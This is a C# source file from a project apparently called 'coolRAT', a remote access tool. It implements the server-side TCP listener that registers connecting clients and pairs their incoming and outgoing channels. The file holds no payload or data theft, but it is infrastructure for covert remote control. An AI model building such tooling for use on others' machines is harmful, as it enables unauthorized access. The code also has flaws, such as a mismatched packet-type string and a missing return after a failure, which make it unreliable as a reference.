using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace coolRAT.Libs.Connections
{
    public class ClientConnectedEventArgs : EventArgs
    {
        public Client Client;

        public ClientConnectedEventArgs(Client client)
        {
            Client = client;
        }
    }
    public class CAP_Server
    {
        public int ListeningPort;
        public TcpListener Listener;
        public Dictionary<Guid, Client> PartialClients;
        public Thread ConnectionAccepterThread;

        public delegate void ClientConnectedHandler(object sender, ClientConnectedEventArgs e);
        public event ClientConnectedHandler OnClientConnected;

        public CAP_Server(int listeningPort)
        {
            ListeningPort = listeningPort;
            Listener = new TcpListener(new IPEndPoint(IPAddress.Any, listeningPort));
            PartialClients = new Dictionary<Guid, Client>();
        }

        public void ListenerLoop()
        {
            while(true)
            {
                TcpConnection newConnection = (TcpConnection)Listener.AcceptTcpClient();
                Task.Run(() =>
                {
                    newConnection.SendReadyMessage();
                    string packet_raw = newConnection.ReceivePacket();
                    Packet packet = Packet.Deserialize(packet_raw);
                    if (packet.Type == "CAP_RegisterClientPacket")
                    {
                        // Register a new partial client
                        Client newClient = new Client(Guid.NewGuid());
                        PartialClients.Add(newClient.UniqueId, newClient);
                        Console.WriteLine($"Registered clients: {PartialClients.Count}");
                        CAP_ClientRegisteredPacket registeredPacket = new CAP_ClientRegisteredPacket(newClient.UniqueId);
                        newConnection.WaitReadyMessage();
                        newConnection.SendPacket(registeredPacket);
                        return;
                    }
                    if (packet.Type == "CAP_LinkConnectionpacket")
                    {
                        newConnection.WaitReadyMessage();
                        CAP_LinkConnectionPacket linkConnectionPacket = CAP_LinkConnectionPacket.Deserialize(packet_raw);
                        if (!PartialClients.ContainsKey(linkConnectionPacket.UniqueClientId))
                        {
                            CAP_ConnectionLinkedPacket fail = new CAP_ConnectionLinkedPacket(linkConnectionPacket.UniqueClientId, false);
                            newConnection.SendPacket(fail);
                        }

                        switch(linkConnectionPacket.ConnectionType)
                        {
                            case ConnectionType.Incoming:
                                PartialClients[linkConnectionPacket.UniqueClientId].Connection.IncomingConnection = newConnection;
                                break;
                            case ConnectionType.Outgoing:
                                PartialClients[linkConnectionPacket.UniqueClientId].Connection.OutgoingConnection = newConnection;
                                break;
                        }

                        CAP_ConnectionLinkedPacket success = new CAP_ConnectionLinkedPacket(linkConnectionPacket.UniqueClientId, true);
                        newConnection.SendPacket(success);

                        Client c = PartialClients[linkConnectionPacket.UniqueClientId];
                        if(c.Connection.IncomingConnection != null && c.Connection.OutgoingConnection != null)
                        {
                            // Client handshake complete
                            PartialClients.Remove(c.UniqueId);
                            if (OnClientConnected == null) return;
                            ClientConnectedEventArgs args = new ClientConnectedEventArgs(c);
                            OnClientConnected(this, args);
                        }
                    }
                });
                
            }
        }

        public void Start()
        {
            if (ConnectionAccepterThread != null) if (ConnectionAccepterThread.IsAlive) Stop();
            ConnectionAccepterThread = new Thread(new ThreadStart(ListenerLoop));
            ConnectionAccepterThread.IsBackground = true;
            Listener.Start();
            ConnectionAccepterThread.Start();
        }

        public void Stop()
        {
            if (ConnectionAccepterThread == null) return;
            if (ConnectionAccepterThread.IsAlive) ConnectionAccepterThread.Abort();
            ConnectionAccepterThread = null;
        }
    }
}
